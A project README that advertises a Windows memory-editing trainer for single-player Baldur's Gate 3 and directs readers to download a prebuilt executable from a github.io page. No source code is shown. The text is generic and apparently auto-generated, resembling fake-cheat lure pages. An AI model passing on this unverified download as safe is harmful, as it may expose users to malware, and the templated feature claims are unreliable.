# Baldur's Gate 3 Trainer v2026 - Game Script Utility 2026

> **A Windows utility for offline, single-player Baldur's Gate 3 sessions, offering trainer-style controls for resources, game pacing, camera movement, and more through live memory editing.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/marcprice2005/baldurs-gate-3-trainer-hub?style=flat-square)](https://github.com/marcprice2005/baldurs-gate-3-trainer-hub)

---

<p align="center">
  <a href="https://marcprice2005.github.io/baldurs-gate-3-trainer-hub/">
    <img src="https://img.shields.io/badge/Download-Baldur's%20Gate%203%20Trainer%20Script-brightgreen?style=for-the-badge" alt="Download Baldur's Gate 3 Trainer Script">
  </a>
</p>

> **[Download Baldur's Gate 3 Trainer](https://marcprice2005.github.io/baldurs-gate-3-trainer-hub/)**

---

[Download Latest Build](https://marcprice2005.github.io/baldurs-gate-3-trainer-hub/)

---

## What It Does

Baldur's Gate 3 Trainer is a portable Windows application that changes selected gameplay values while an offline, single-player session is running. After connecting to the game's active process, it provides controls for resources, camp supplies, carrying capacity, turn-based pacing, companion approval, currency, and camera behavior.

This 2026 release uses a live-memory workflow built around patch-aware, versioned offsets. An in-session hotkey overlay makes the available controls visible, while the standalone format keeps setup to downloading and starting the executable.

---

## Available Trainer Controls

- Lock selected resources at their current values.
- Set or override camp supply amounts.
- Modify carrying-capacity behavior.
- Change the pace of turn-based gameplay.
- Adjust companion approval values.
- Modify gold and other supported currencies.
- Expand camera movement options.
- View trainer controls and shortcuts with the hotkey overlay.
- Connect to a running Baldur's Gate 3 process through memory editing.
- Apply offsets corresponding to supported game patches.
- Use the utility as a standalone executable with no installation required.

---

## Getting Started

1. Download the newest Windows build using the link above.
2. Unpack the archive when the download is compressed.
3. Open Baldur's Gate 3 and load the single-player session you want to use.
4. Run the trainer executable.
5. Turn on or select the desired controls.
6. Leave the trainer running for the duration of the game session.

The trainer is intended to run without installation. Store the executable in an accessible folder, and if the release includes supporting files, keep them with the executable rather than moving or renaming them.

---

## Control Reference

The controls exposed by a build can depend on the connected game version and the release currently in use.

| Option | Purpose |
|---|---|
| Resource Freeze | Keeps supported resource values from changing. |
| Camp Supply Override | Changes the camp supply value used by the active session. |
| Carry Weight | Alters the behavior of available carrying capacity. |
| Turn-Based Pace | Changes the speed or pacing of turn-based play. |
| Companion Approval | Modifies supported approval values for companions. |
| Gold and Currency | Changes supported currency amounts. |
| Camera Freedom | Provides broader camera movement controls. |
| Hotkey Overlay | Displays the trainer's active shortcuts and controls. |

### Standard Session Flow

```text
Start game -> Load single-player session -> Launch trainer -> Attach to game -> Enable options
```

Check the on-screen overlay for the hotkeys and controls supported by the current build.

---

## Compatibility and Requirements

- **Target game:** Baldur's Gate 3
- **Platform:** Windows
- **Mode:** Single-player, offline use
- **Build type:** Standalone executable
- **Memory model:** Live attachment with versioned offsets
- **Version support:** Use a trainer build whose offsets match the installed game patch

Updates to the game can relocate memory values and may cause some controls to stop working. If the trainer cannot attach or a control has no effect, exit the utility, find a build for the installed patch, and do not depend on offsets from an earlier release.

---

## 2026 Changelog

- Published the current Windows trainer build.
- Continued using patch-aware offset handling.
- Maintained controls for resources, inventory, currency, pacing, approval, and camera behavior.
- Kept the utility standalone and installation-free.
- Added or preserved the in-session hotkey overlay.

---

## Frequently Asked Questions

### What is the setup process?

Download the Windows build, start Baldur's Gate 3, and load a single-player session. Then launch the trainer, attach it to the running game, and enable the controls you need.

### Do I need to install anything?

No. The trainer is provided as a standalone executable and does not require an installation step.

### Is it compatible with every game update?

Not automatically. Compatibility is determined by the Baldur's Gate 3 patch installed on your system and the offsets included in the trainer build. Select a release intended for that game version.

### Are the controls customizable?

The current release exposes its supported options and hotkeys through the trainer. Use the overlay to see what is available; the extent of customization depends on the settings included with that build.

### Where should I keep the files?

Place the executable and any files supplied with it together in a dedicated local folder. No special installation directory is needed.

### Can it be used in multiplayer?

The extracted profile describes this utility as intended for offline, single-player use. Before using it in another context, check the game's rules along with relevant platform and community terms.

### How can I troubleshoot game detection?

Make sure Baldur's Gate 3 is open, the intended session has loaded, and the trainer build matches the installed patch. Closing and restarting both applications may also renew the attachment attempt.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
